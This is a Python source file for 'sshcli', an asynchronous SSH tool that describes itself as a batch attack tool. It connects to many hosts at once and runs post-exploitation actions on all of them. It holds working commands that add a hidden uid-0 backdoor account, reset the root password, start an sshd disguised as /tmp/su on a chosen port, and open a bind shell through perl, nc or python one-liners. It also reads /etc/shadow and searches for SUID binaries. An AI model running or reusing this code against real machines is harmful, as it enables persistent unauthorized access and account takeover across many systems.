import os
import json
import asyncio

import asyncssh

import logging
import logging.config

from ..utils.extract_host import *
from ..utils.set_proxy import SSHProxy
from ..utils.pseudo_terminal import PTerminal
from ..utils.key_input import KeyInput
from ..utils.print_table import PrintTable

sshcli_version = "1.0.6"
sshcli_author = "Comentropy Ckyan"
sshcli_author_email = "comentropy@foxmail.com"
sshcli_git_url = "https://github.com/c0mentropy/sshcli.git"
sshcli_description = "Asynchronous batch attack based on ssh connection"

painting_name = rf"""
   __________ __  __   ________    ____
  / ___/ ___// / / /  / ____/ /   /  _/
  \__ \\__ \/ /_/ /  / /   / /    / /  
 ___/ /__/ / __  /  / /___/ /____/ /   
/____/____/_/ /_/   \____/_____/___/   
               sshcli version: {sshcli_version}                        
"""


class SSHManager:
    def __init__(self, hosts: list[str] = None, user_datas: dict[str, dict[str, str]] = None,
                 username: str = "", password: str = "",
                 private_key_path : str = "",
                 port: int = 22, timeout: int = 3, 
                 log_config_file_path: str = "", log_level: str = "", 
                 proxy: bool = False, proxy_config_file_path: str = ""):
        """
        Initialize SSH management class
        :param hosts: A list containing hostnames or IP addresses
        :param user_datas: A dictionary containing username and password information for each host
        :param username: SSH login username
        :param password: SSH login password
        :param private_key_path: The key of the SSH connection
        :param port: The port number for SSH connection is 22 by default.
        :param timeout: Limit time for command execution after SSH connection (to avoid all connections being disconnected due to a stuck command)
        :param log_config_file_path: The path to the log configuration file
        :param log_level: Log level
        :param proxy: Whether or not to use a proxy
        :param proxy_config_file_path: Set the profile path for the network proxy
        """

        self.private_key_path = private_key_path

        self.user_datas: dict[str, dict[str, str]] = {}  # {host: {username: "", password: "", private_key_path: ""} }
        if hosts is not None and username != "":
            self.hosts: list[str] = hosts
            self.username: str = username
            self.password: str = password

            for host in self.hosts:
                self.user_datas[host] = {
                    "username": self.username,
                    "password": self.password
                }

        elif user_datas is not None:
            self.user_datas.update(user_datas)
        else:
            self.logger.error("[sshcli] user_datas is None")
            raise ValueError("user_datas is None")
        
        for host in self.user_datas.keys():
            if "private_key_path" in self.user_datas[host].keys():
                break

            if self.private_key_path != "":
                self.user_datas[host]["private_key_path"] = self.private_key_path
            else:
                self.user_datas[host]["private_key_path"] = ""

        # print(self.user_datas)

        self.port: int = port
        self.timeout: int = timeout

        self.connections: dict = {}  # {host: conn}

        current_script_path = os.path.abspath(__file__)
        current_script_dir = os.path.dirname(current_script_path)
        # Current script’s parent directory
        self.current_script_parent_dir = os.path.dirname(current_script_dir)

        self.logger = logging.getLogger()

        self.log_config_file_path = log_config_file_path
        self.log_level = log_level

        '''
        # Log
        if log_config_file_path == "":
            # parent_dir = os.path.dirname(current_script_dir)
            log_config_file_path = os.path.join(current_script_dir, "conf/logging_config.yaml")

        with open(log_config_file_path, 'r') as file:
            log_config = yaml.safe_load(file)

        logging.config.dictConfig(log_config)

        self.logger = logging.getLogger()

        if log_level != "":
            self.set_log_level("root", log_level)

        # Log Level

        self.logger.info(painting_name)
        self.logger.info(f"[sshcli] logging config file found: {log_config_file_path}")
        '''

        if proxy_config_file_path == "":
            proxy_config_file_path = os.path.join(self.current_script_parent_dir, "conf/proxy_config.ini")

        if proxy:
            self.logger.info("[sshcli] proxy mode is enabled")
            self.logger.info(f"[sshcli] proxy config file found: {proxy_config_file_path}")
            self.ssh_proxy = SSHProxy()
            self.tunnel = self.ssh_proxy.get_proxy(proxy_config_file_path)
            self.logger.info(f"[sshcli] The network proxy used is {self.ssh_proxy.proxy_ip}:{self.ssh_proxy.proxy_port}")
        else:
            self.logger.info("[sshcli] proxy mode is disabled")
            self.ssh_proxy = None
            self.tunnel = None
        
        self.key_input = KeyInput()

    def save_user_data(self, save_user_datas_file_path: str = "./hosts.json"):
        self.logger.info(f"[sshcli] saving user data to {save_user_datas_file_path}")
        with open(save_user_datas_file_path, 'w') as json_file:
            json.dump(self.user_datas, json_file, indent=4)

    def set_log_level(self, logger_name, level):
        logger = logging.getLogger(logger_name)
        level_dict = {
            'DEBUG': logging.DEBUG,
            'INFO': logging.INFO,
            'WARNING': logging.WARNING,
            'WARN': logging.WARN,
            'ERROR': logging.ERROR,
            'CRITICAL': logging.CRITICAL,
        }
        level = level.upper()
        if level in level_dict:
            logger.setLevel(level_dict[level])
            for handler in logger.handlers:
                handler.setLevel(level_dict[level])
            self.logger.info(f"The log level has been set to {level}")
        else:
            self.logger.warning(f"Invalid log level: {level}")

    async def connect_ssh(self, hostname: str, user_data: dict):
        """
        Connect to a host asynchronously and return the connection object
        :param hostname: The IP or domain name of the remote host
        :return: connection object
        """

        if ':' in hostname:
            host_list = hostname.split(":")
            ip = host_list[0]
            port = int(host_list[1])
        else:
            ip = hostname
            port = self.port
        
        if self.ssh_proxy is not None and not self.ssh_proxy.should_bypass_proxy(ip):
            tunnel = self.tunnel
        else:
            tunnel = None
        
        # print(tunnel)

        try:
            if user_data['private_key_path'] != "":
                self.logger.info(f"[sshcli] using private key: {user_data['private_key_path']}")
                conn = await asyncssh.connect(
                    ip,
                    username=user_data['username'], 
                    password=user_data['password'],
                    port=port,
                    known_hosts=None,
                    client_keys=[user_data['private_key_path']],
                    passphrase=user_data['password'],
                    tunnel=tunnel
                )
                self.logger.info(f"user {user_data['username']} connected to {hostname} on port {port} with private key {user_data['private_key_path']}")
            else:
                conn = await asyncssh.connect(
                    ip,
                    username=user_data['username'], 
                    password=user_data['password'], 
                    port=port,
                    known_hosts=None,
                    tunnel=tunnel
                )
                self.logger.info(f"user {user_data['username']} connected to {hostname} on port {port} with password")
            return conn
        except Exception as e:
            self.logger.error(f"Failed to connect to {hostname}: {e}")
            return None

    async def connect_to_all_hosts(self):
        """
        Connect to all hosts asynchronously
        :return: List of all connection objects
        """

        connections = await asyncio.gather(
            *[self.connect_ssh(hostname, user_data) for hostname, user_data in self.user_datas.items()]
        )
        
        # Convert the connection result into a dictionary, the key is hostname, and the value is the connection object
        self.connections = {
            key: connections[i] for i, key in enumerate(self.user_datas.keys())
        }

        return self.connections

    async def run_command_on_all_hosts(self, command: str) -> str:
        """
        Execute command on all connected hosts
        :param command: Commands to be executed
        """
        for hostname, conn in self.connections.items():
            if conn is not None:
                try:
                    self.logger.debug(f"Run Command: {command}")
                    # result = await conn.run(command, check=True, timeout=self.timeout)
                    result = await conn.run(command, check=False ,timeout=self.timeout)
                    self.logger.info(f"Output from {hostname}:")
                    if result.stdout:
                        out = result.stdout.rstrip('\n')
                        print(f"[+] START Stdout:\n{out}\n[+] END\n")
                    if result.stderr:
                        err = result.stderr.rstrip('\n')
                        self.logger.error(f"\n[-] START Stderr:\n{hostname}: {err}\n[-] END\n")
                    # print(result.stdout)
                except Exception as e:
                    self.logger.error(f"Error executing command on {hostname}: {e}")
                    # print(result.stderr)

    async def upload_file(self, local_path: str, remote_path: str):
        """
        Upload files to all hosts
        :param local_path: local file path
        :param remote_path: Remote file path
        """
        for hostname, conn in self.connections.items():
            if conn is not None:
                try:
                    async with conn.start_sftp_client() as sftp:
                        await sftp.put(local_path, remote_path)
                        self.logger.info(f"File {local_path} uploaded to {hostname}:{remote_path}")
                except Exception as e:
                    self.logger.error(f"Failed to upload {local_path} to {hostname}: {e}")

    async def download_file(self, remote_path: str, local_path: str):
        """
        Download files from all hosts
        :param remote_path: Remote file path
        :param local_path: local file path
        """
        for hostname, conn in self.connections.items():
            if conn is not None:
                try:
                    async with conn.start_sftp_client() as sftp:
                        new_local_path = os.path.join(local_path.rstrip('/'), str(hostname).lstrip('/')) + '/'
                        os.makedirs(new_local_path, exist_ok=True)
                        await sftp.get(remote_path, new_local_path)
                        self.logger.info(f"File {remote_path} downloaded from {hostname} to {new_local_path}")
                except Exception as e:
                    self.logger.error(f"Failed to download {remote_path} from {hostname}: {e}")

    async def close_connections(self):
        """
        Close all SSH connections
        """
        for hostname, conn in self.connections.items():
            if conn is not None:
                conn.close()
                self.logger.info(f"Connection to {hostname} closed.")
    
    async def sessions(self):
        raise NotImplementedError("sessions() is not define")
    
    async def add_user(self, username: str, password: str, is_root: bool = True):

        permission = 'root' if is_root else "not root"
        self.logger.debug(f"The user to be added is: {username}, the password is: {password}, permissions is: {permission}")

        # useradd -p `openssl passwd -1 -salt 'salt' admin123` hacker -o -u 0 -g root -G root -s /bin/bash -d /home/hacker
        # useradd -p `openssl passwd -1 -salt 'salt' admin123` hacker
        if is_root:
            command = f"useradd -p `openssl passwd -1 -salt 'salt' {password}` {username} -o -u 0 -g root -G root -s /bin/bash -d /home/{username}"
        else:
            command = f"useradd -p `openssl passwd -1 -salt 'salt' {password}` {username}"
        
        await self.run_command_on_all_hosts(command)
    
    async def ln_sshd(self, port: int, path: str = "/tmp"):

        self.logger.debug(f"The port on which the soft connection SSH is bound is: {port}, path is: {path}")

        # ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=9001
        command = f"ln -sf /usr/sbin/sshd {path}/su;{path}/su -oPort={port}"
        await self.run_command_on_all_hosts(command)
    
    async def change_passwd(self, new_passwd: str, user: str = "root"):

        self.logger.debug(f"The new password is: {new_passwd}, user is: {user}")

        # echo 'root:admin123' | chpasswd
        command = f"echo '{user}:{new_passwd}' | chpasswd"
        await self.run_command_on_all_hosts(command)
    
    async def bind_shell(self, port: int, shell: str = "/bin/sh"):

        self.logger.debug(f"The port that bind the forward connection is: {port}, shell is: {shell}")

        command = f'''
        if command -v perl > /dev/null 2>&1; then
        perl -e 'use Socket;$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){{open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("{shell} -i");}};' &
        exit;
        fi
        if command -v nc > /dev/null 2>&1; then
        rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | {shell} -i 2>&1 | nc -l 0.0.0.0 {port} > /tmp/f &
        exit;
        fi
        if command -v python > /dev/null 2>&1; then
        python3 -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",{port}));s1.listen(1);c,a=s1.accept();
        while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
        exit;
        fi
        '''
        # command += ""
        await self.run_command_on_all_hosts(command)
    
    async def find_suid(self, path: str = "/"):
        self.logger.debug(f"Find files with suid permissions from directory {path}")
        # find / -user root -perm -4000 -print 2>/dev/null
        command = f"find {path} -user root -perm -4000 -print 2>/dev/null"
        await self.run_command_on_all_hosts(command)
    
    async def query_permissions(self, uid: int = 0, path: str = "/"):

        self.logger.debug("Query some permission information")

        # awk -F: '$3==0{print $1}' /etc/passwd
        # awk '/\$1|\$6/{print $1}' /etc/shadow
        self.logger.info(f"Users with uid equal to {uid}: ")
        command = f"awk -F: '$3=={uid}{{print $1}}' /etc/passwd"
        await self.run_command_on_all_hosts(command)

        self.logger.info("Account that can be used to log in remotely: ")
        command = r"awk '/\$1|\$6/{print $1}' /etc/shadow"
        await self.run_command_on_all_hosts(command)

        self.logger.info(f"Query the suid of the overridden file from: {path}")
        await self.find_suid(path)

    async def run_shell(self):

        self.logger.debug("[sshcli] Enter the separate shell operation interface")

        self.logger.info("Enter separate shell operation")
        
        idx = 1
        temp_host_list = []

        cool = True
        if cool:
            table_data = []
            for host, user_data in self.user_datas.items():
                table = {}
                table['ID'] = idx
                table['User'] = user_data['username']
                table['Platform'] = 'linux'
                table['Type'] = 'ssh'
                table['Address'] = host

                table_data.append(table)

                idx += 1
                temp_host_list.append(host)
            
            title = "Active Sessions"
            print_table = PrintTable()
            print_table.printf(table_data, title)

        else:
            for host, _ in self.user_datas.items():
                print(f'{idx}. {host}')
                idx += 1
                temp_host_list.append(host)

        choice_host = await self.key_input.input("Choice a session: ")
        choice_host = choice_host.strip()

        if choice_host.isdigit():
            try:
                final_choice_host = temp_host_list[(int(choice_host) - 1) % len(temp_host_list)]
            except Exception as ex:
                print(ex)
                return
        else:
            final_choice_host = choice_host
        
        try:
            self.logger.debug(f"Connecting Host: {final_choice_host}")
            conn = self.connections[final_choice_host]
            
            p_terminal = PTerminal(conn.run)
            await p_terminal.run()
            
            self.logger.debug(f"Closing connection to Host: {final_choice_host}")
            self.logger.info("Exit separate shell operation")

        except Exception as ex:
            self.logger.error(f"{self.run_shell.__name__}: {ex}")
            return


    async def interactive(self):
        while True:
            command = await self.key_input.input("\033[31m(meterpreter)\033[0m\033[35msshcli\033[0m\033[33m$\033[0m ")
            command = command.strip()

            run_command = command
            command = command.lower()

            if command == "exit":
                break
            elif command == 'clear' or command == 'cls':
                if os.name == 'posix':
                    os.system('clear')
                    continue
                elif os.name == 'nt':
                    os.system('cls')
                    continue
            
            elif command == "upload":
                local_file = input("local file path: ").strip()
                remote_file = input("upload remote file path: ").strip()
                await self.upload_file(local_file, remote_file)
            elif command == "download":
                remote_file = input("remote file path: ").strip()
                local_file = input("download local file path: ").strip()
                await self.download_file(remote_file, local_file)
            elif command == "adduser":
                username = input("username: ").strip()
                password = input("password: ").strip()
                input_is_root = input("is root (Y/n): ").strip().lower()
                is_root = True if input_is_root != "false" and "n" not in input_is_root else False
                await self.add_user(username, password, is_root)
            elif command == "lnsshd":
                port = int(input("port: "))
                input_temp_path = input("temp path: (default: /tmp)").strip()
                if input_temp_path == "":
                    temp_path = "/tmp"
                else:
                    temp_path = input_temp_path
                await self.ln_sshd(port, temp_path)
            elif command == "bind shell":
                port = int(input("port: "))
                input_shell = input("shell (default: /bin/sh): ").strip()
                if input_shell == "":
                    shell = "/bin/sh"
                else:
                    shell = input_shell
                await self.bind_shell(port, shell)
            elif command == "change passwd":
                new_passwd = input("new passwd: ").strip()
                input_user = input("user (default: root): ").strip()
                if input_user == "":
                    user = "root"
                else:
                    user = input_user
                await self.change_passwd(new_passwd, user)
            elif command == "suid getshell":
                self.logger.warning("This feature is not yet implemented")                
            elif command == "query perm":
                input_uid = input("UID (default: 0): ").strip()
                if input_uid == "":
                    uid = "0"
                else:
                    uid = input_uid
                input_path = input("find path (default: /usr/bin): ").strip()
                if input_path == "":
                    path = "/usr/bin"
                else:
                    path = input_path
                await self.query_permissions(uid, path)
            elif command == "shell":
                await self.run_shell()
            elif command == "local":
                if os.name == 'posix':
                    os.system('bash')
                elif os.name == 'nt':
                    os.system('cmd')
            elif command == "help":
                self.logger.info("Output help documentation")
                
                manual_path = os.path.join(self.current_script_parent_dir, "conf/manual.json")

                try:
                    with open(manual_path, 'r', encoding='utf-8') as file:
                        manual_data = json.load(file)
                except Exception as ex:
                    manual_data = {}
                    self.logger.error(ex)

                table_data = []

                for key, value in manual_data.items():
                    table = {} # # table = {"Command": "upload", "Description": ""}
                    table["Command"] = key
                    table["Description"] = value

                    table_data.append(table)
                
                title = "Help Manual"

                print_table = PrintTable()
                print_table.printf(table_data, title)
                
            else:
                if run_command != "":
                    try:
                        await self.run_command_on_all_hosts(run_command)
                    except Exception as ex:
                        self.logger.error(f"Exception: {ex}")
    
    async def main(self):
        raise NotImplementedError(f"{self.main.__name__}: This function is not defined")

    async def run(self):
        # asyncio.run(run_func())
        raise NotImplementedError(f"{self.run.__name__}: This function is not defined")

